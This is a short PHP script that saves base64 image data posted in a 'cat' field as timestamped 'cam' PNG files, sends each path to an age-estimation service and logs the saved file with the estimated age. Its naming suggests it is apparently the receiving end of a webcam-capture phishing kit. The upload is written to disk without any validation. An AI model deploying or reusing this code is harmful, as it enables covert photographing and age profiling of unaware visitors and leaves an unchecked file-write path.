<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

$unencodedData=base64_decode($imageData);
$data = 'cam'.$date.'.png';
$imagePath = '../../images/'.$data;
$fp = fopen($imagePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Estimate age via age-service
$age = null;
$confidence = null;
$ageServiceUrl = getenv('AGE_SERVICE_URL') ?: ($_SERVER['AGE_SERVICE_URL'] ?? '');
if ($ageServiceUrl) {
    $absPath = realpath($imagePath);
    $ch = curl_init($ageServiceUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['image_path' => $absPath]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    if ($resp) {
        $result = json_decode($resp, true);
        if (isset($result['age'])) {
            $age = $result['age'];
            $confidence = $result['confidence'];
        }
    }
}

$ageInfo = $age !== null ? " | Age: ~{$age} ({$confidence}% confidence)" : "";
file_put_contents("result.txt", "Image File Was Saved ! > /images/".$data.$ageInfo);

header('Content-Type: application/json');
echo json_encode([
    'success' => true,
    'image' => '/images/'.$data,
    'age' => $age,
    'confidence' => $confidence,
]);
?>
